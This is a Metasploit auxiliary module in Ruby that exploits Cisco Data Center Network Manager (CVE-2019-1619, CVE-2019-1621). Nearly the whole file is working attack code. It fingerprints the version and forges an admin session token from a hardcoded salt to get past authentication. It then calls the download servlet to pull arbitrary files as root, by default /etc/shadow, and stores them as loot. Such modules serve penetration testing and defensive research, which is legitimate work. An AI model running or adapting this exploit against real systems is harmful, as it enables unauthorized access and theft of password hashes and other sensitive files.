##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco Data Center Network Manager Unauthenticated File Download',
      'Description'    => %q{
        DCNM exposes a servlet to download files on /fm/downloadServlet.
        An authenticated user can abuse this servlet to download arbitrary files as root by specifying
        the full path of the file.
        This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should
        work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit
        (see References to understand why).
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2019-1619' ],
          [ 'CVE', '2019-1621' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-bypass' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190626-dcnm-file-dwnld' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/exploits/metasploit/cisco_dcnm_download.rb' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jul/7' ]
        ],
      'DisclosureDate' => 'Jun 26 2019'
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Connect with TLS', true]),
        OptString.new('TARGETURI', [true,  "Default server path", '/']),
        OptString.new('USERNAME', [true,  "Username for auth (required only for 11.0(1)", 'admin']),
        OptString.new('PASSWORD', [true,  "Password for auth (required only for 11.0(1)", 'admin']),
        OptString.new('FILEPATH', [false, 'Path of the file to download', '/etc/shadow']),
      ])
  end

  def auth_v11
    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, 'fm/'),
      'method' => 'GET',
      'vars_get'  =>
      {
        'userName'  => datastore['USERNAME'],
        'password'  => datastore['PASSWORD']
      },
    )

    if res && res.code == 200
      # get the JSESSIONID cookie
      if res.get_cookies
        res.get_cookies.split(';').each do |cok|
          if cok.include?("JSESSIONID")
            return cok
          end
        end
      end
    end
  end

  def auth_v10
    # step 1: get a JSESSIONID cookie and the server Date header
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path, 'fm/'),
      'method' => 'GET'
    })

    # step 2: convert the Date header and create the auth hash
    if res && res.headers['Date']
      jsession = res.get_cookies.split(';')[0]
      date = Time.httpdate(res.headers['Date'])
      server_date = date.strftime("%s").to_i * 1000
      print_good("#{peer} - Got sysTime value #{server_date.to_s}")

      # auth hash format:
      # username + sessionId + sysTime + POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF
      session_id = rand(1000..50000).to_s
      md5 = Digest::MD5.digest 'admin' + session_id + server_date.to_s +
        "POsVwv6VBInSOtYQd9r2pFRsSe1cEeVFQuTvDfN7nJ55Qw8fMm5ZGvjmIr87GEF"
      md5_str = Base64.strict_encode64(md5)

      # step 3: authenticate our cookie as admin
      # token format: sessionId.sysTime.md5_str.username
      res = send_request_cgi(
        'uri'    => normalize_uri(target_uri.path, 'fm', 'pmreport'),
        'cookie' => jsession,
        'vars_get'  =>
        {
          'token'  => "#{session_id}.#{server_date.to_s}.#{md5_str}.admin"
        },
        'method' => 'GET'
      )

      if res and res.code == 500
        return jsession
      end
    end
  end

  def run
    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, 'fm', 'fmrest', 'about','version'),
      'method' => 'GET'
    )
    noauth = false

    if res && res.code == 200
      if res.body.include?('version":"11.1(1)')
        print_good("#{peer} - Detected DCNM 11.1(1)")
        print_status("#{peer} - No authentication required, ready to exploit!")
        noauth = true
      elsif res.body.include?('version":"11.0(1)')
        print_good("#{peer} - Detected DCNM 11.0(1)")
        print_status("#{peer} - Note that 11.0(1) requires valid authentication credentials to exploit")
        jsession = auth_v11
      elsif res.body.include?('version":"10.4(2)')
        print_good("#{peer} - Detected DCNM 10.4(2)")
        print_status("#{peer} - No authentication required, ready to exploit!")
        jsession = auth_v10
      else
        print_error("#{peer} - Failed to detect module version.")
        print_error("Please contact module author or add the target yourself and submit a PR to the Metasploit project!")
        print_error(res.body)
        print_error("#{peer} - Trying unauthenticated method for DCNM 10.4(2) and below...")
        jsession = auth_v10
      end
    end

    if jsession or noauth
      print_good("#{peer} - Successfully authenticated our JSESSIONID cookie")
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate JSESSIONID cookie")
    end

    res = send_request_cgi(
      'uri'    => normalize_uri(target_uri.path, 'fm', 'downloadServlet'),
      'method' => 'GET',
      'cookie' => jsession,
      'vars_get' => {
        'showFile' => datastore['FILEPATH'],
      }
    )

    if res and res.code == 200 and res.body.length > 0
      filedata = res.body
      vprint_line(filedata.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'cisco-DCNM.http',
        'application/octet-stream',
        datastore['RHOST'],
        filedata,
        fname
      )
      print_good("File saved in: #{path}")
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to download file #{datastore['FILEPATH']}")
    end
  end
end
